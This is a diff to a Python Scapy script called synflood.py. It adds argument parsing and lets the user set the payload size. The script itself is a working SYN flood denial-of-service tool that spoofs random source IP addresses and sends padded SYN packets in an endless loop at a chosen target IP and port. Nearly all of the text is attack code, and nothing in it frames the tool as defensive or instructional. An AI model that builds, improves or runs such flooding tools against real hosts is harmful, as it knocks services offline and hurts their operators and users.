@@ -18,6 +18,10 @@ import os, sys
 from colorama import Fore as F
 from colorama import Style as S
 
+# check for arugments
+if len(sys.argv) < 4:
+	print(F.RED + S.BRIGHT + "[-] Usage: ./synflood.py target_ip port #_of_kb" + S.RESET_ALL)
+	quit()
 
 # begin code
 
@@ -32,11 +36,11 @@ ip = IP(src=RandIP("192.168.1.1/16"), dst=target_ip)
 tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
 
 # add raw data to assist in flooding
-raw_data = Raw(b"X"*1024*10) # 1 kb
+raw_data = Raw(b"X"*1024*int(sys.argv[3])) # 1 kb
 
 # stack the layers
 packet = ip/tcp/raw_data
 
 #send the packet
-print(F.GREEN + S.BRIGHT + "[+] " + S.RESET_ALL + "sending packets")
+print(F.GREEN + S.BRIGHT + "[+] " + S.RESET_ALL + "sending packets. press CTRL+Z to stop.")
 send(packet, loop=1, verbose=1)
